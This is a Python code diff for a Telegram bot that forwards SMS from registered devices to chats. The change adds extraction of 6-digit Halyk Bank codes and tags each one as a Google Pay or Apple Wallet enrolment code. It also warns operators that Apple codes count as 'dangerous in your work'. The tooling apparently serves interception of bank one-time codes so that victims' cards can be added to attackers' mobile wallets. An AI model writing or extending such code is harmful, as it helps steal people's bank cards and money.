@@ -4,7 +4,8 @@
 """
 import asyncio
 import os
-from typing import Optional
+import re
+from typing import Optional, Tuple
 from aiogram import Bot
 from aiogram.enums import ParseMode
 from aiogram.client.default import DefaultBotProperties
@@ -40,6 +41,53 @@ def init_telegram_bot():
         print(f"❌ Ошибка инициализации Telegram бота: {e}")
 
 
+def extract_halyk_code(message: str) -> Tuple[Optional[str], bool]:
+    """
+    Извлечь код из SMS от Halyk и определить тип (Google Pay или Apple Wallet)
+    
+    Returns:
+        Tuple[code, is_apple]: (код или None, True если Apple Wallet)
+    """
+    # Проверяем, что SMS от Halyk
+    if 'Halyk' not in message and 'halyk' not in message.lower():
+        return None, False
+    
+    # Ищем 6-значный код в начале сообщения
+    code_match = re.search(r'^(\d{6})', message.strip())
+    if not code_match:
+        return None, False
+    
+    code = code_match.group(1)
+    
+    # Определяем тип (Apple Wallet или Google Pay)
+    is_apple = 'apple' in message.lower() or 'iphone' in message.lower()
+    
+    return code, is_apple
+
+
+def format_sms_message(sender: str, message: str) -> Tuple[str, Optional[str]]:
+    """
+    Форматировать SMS сообщение с учетом кодов Halyk
+    
+    Returns:
+        Tuple[formatted_message, warning]: (отформатированное сообщение, предупреждение или None)
+    """
+    code, is_apple = extract_halyk_code(message)
+    
+    if code:
+        # Найден код от Halyk
+        formatted = message.replace(code, f'<code>{code}</code>', 1)
+        
+        warning = None
+        if is_apple:
+            warning = "⚠️ <b>ВНИМАНИЕ!</b> Это код для <b>iPhone</b> (Apple Wallet)!\n🚨 В вашей работе такие коды считаются опасными!"
+        
+        return formatted, warning
+    
+    # Обычное сообщение
+    return message, None
+
+
 async def _send_sms_notification_async(device_id: str, sender: str, message: str, timestamp: str):
     """Асинхронная отправка уведомления о SMS"""
     if not _bot:
@@ -57,14 +105,21 @@ async def _send_sms_notification_async(device_id: str, sender: str, message: str
         device = get_device_by_id(device_id)
         device_name = device.get('name', 'Неизвестное устройство') if device else device_id
         
-        # Форматируем сообщение
+        # Форматируем сообщение с учетом кодов Halyk
+        formatted_message, warning = format_sms_message(sender, message)
+        
+        # Базовое уведомление
         notification = (
             f"📨 <b>Новое SMS</b>\n\n"
             f"<b>Устройство:</b> {device_name}\n"
             f"<b>От:</b> <code>{sender}</code>\n"
             f"<b>Время:</b> {timestamp}\n\n"
-            f"<b>Сообщение:</b>\n{message}"
+            f"<b>Сообщение:</b>\n{formatted_message}"
         )
+        
+        # Добавляем предупреждение, если это код для Apple
+        if warning:
+            notification += f"\n\n{warning}"
         
         # Отправляем уведомления во все чаты
         for chat_id in chat_ids:
